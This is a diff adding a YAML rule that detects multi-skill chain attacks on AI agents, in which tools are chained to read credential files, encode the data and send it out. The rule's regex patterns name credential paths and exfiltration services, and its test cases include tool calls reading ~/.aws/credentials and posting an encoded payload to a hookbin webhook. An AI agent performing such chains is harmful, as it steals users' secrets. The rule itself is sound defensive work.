@@ -1,0 +1,115 @@
+# =============================================================
+# atr.skill-compromise.multi-skill-chain-attack
+# =============================================================
+# Adapted from ATR-2026-00063 (https://github.com/Agent-Threat-Rule/agent-threat-rules)
+# MIT (c) 2026 ATR Contributors
+# Severity: critical  |  ASAMM: AI-01 (+AG-02,AD-04)
+# =============================================================
+atr_source:
+  original_id: ATR-2026-00063
+  original_title: Multi-Skill Chain Attack
+  atr_version: '0.1'
+  rule_version: 1
+  status: experimental
+  maturity: experimental
+  import_date: '2026-04-21'
+  upstream: https://github.com/Agent-Threat-Rule/agent-threat-rules
+  license: MIT (c) 2026 ATR Contributors
+agent_audit_id: atr.skill-compromise.multi-skill-chain-attack
+title: Multi-Skill Chain Attack
+description: 'Detects attack sequences where multiple MCP skills are chained together to achieve a malicious outcome that
+  no single skill could accomplish alone. For example: (1) a reconnaissance skill reads sensitive files, (2) an encoding skill
+  obfuscates the data, (3) a network skill exfiltrates it. Each step appears benign individually but the chain constitutes
+  data exfiltration.'
+severity_default: critical
+category: skill-compromise
+audit_surface:
+- skill_md
+- mcp_manifest
+- plugin_manifest
+- instruction_file
+asamm:
+  primary: AI-01
+  secondary:
+  - AG-02
+  - AD-04
+  mapping_confidence: category-default
+  notes: Category-level default applied at import. Review per rule.
+references:
+  owasp_llm:
+  - LLM03:2025 - Supply Chain Vulnerabilities
+  - LLM06:2025 - Excessive Agency
+  owasp_agentic:
+  - ASI02:2026 - Tool Misuse and Exploitation
+  mitre_atlas:
+  - AML.T0024 - Exfiltration via ML Inference API
+  - AML.T0053 - LLM Plugin Compromise
+tags:
+  category: tool-poisoning
+  subcategory: skill-chain
+  scan_target: mcp
+  confidence: medium
+agent_source:
+  type: tool_call
+  framework:
+  - mcp
+  - langchain
+  - crewai
+  - autogen
+  provider:
+  - any
+detection:
+  conditions:
+  - field: tool_args
+    operator: regex
+    value: (?i)(/etc/passwd|/etc/shadow|(?<![a-z])\.(env|aws/credentials)|secrets?\.json|private[_-]?key|id_rsa|kubeconfig)
+    description: Sensitive file/credential access patterns (path-specific, not bare word 'credentials')
+  - field: tool_args
+    operator: regex
+    value: (?i)(base64|btoa|encodeURI|hex\.encode|rot13|xor|compress|gzip|deflate|encrypt)
+  - field: tool_args
+    operator: regex
+    value: (?i)(webhook|ngrok|requestbin|pipedream|hookbin|burpcollaborator|interact\.sh|oast)
+  - field: tool_name
+    operator: regex
+    value: (?i)(send[_-]?(email|message|webhook|http|request)|upload|post[_-]?data|transmit|exfil)
+  condition: any
+  false_positives:
+  - Legitimate backup or migration workflows that read, compress, and transfer files
+  - CI/CD pipelines that encode artifacts for deployment
+  - Monitoring tools that send alerts via webhooks
+response:
+  actions:
+  - block_tool
+  - alert
+  - snapshot
+  - escalate
+  auto_response_threshold: high
+  message_template: '[ATR-2026-063] Potential skill chain attack detected. Tool call appears to be part of a multi-step attack
+    sequence (reconnaissance -> encoding -> exfiltration). Review the full session tool call history.
+
+    '
+test_cases:
+  true_positives:
+  - input:
+      tool_name: file_reader
+      tool_args: '{"path": "/home/user/.aws/credentials"}'
+    expected: triggered
+    matched_condition: reading sensitive credential file
+  - input:
+      tool_name: send_webhook
+      tool_args: '{"url": "https://hookbin.com/abc123", "data": "encoded_payload"}'
+    expected: triggered
+    matched_condition: sending data to known exfiltration endpoint
+  true_negatives:
+  - input:
+      tool_name: file_reader
+      tool_args: '{"path": "/home/user/documents/report.pdf"}'
+    expected: not_triggered
+    reason: Reading a normal user document
+  - input:
+      tool_name: email_sender
+      tool_args: '{"to": "team@company.com", "subject": "Meeting notes"}'
+    expected: not_triggered
+    reason: Sending normal business email
+false_positives: []
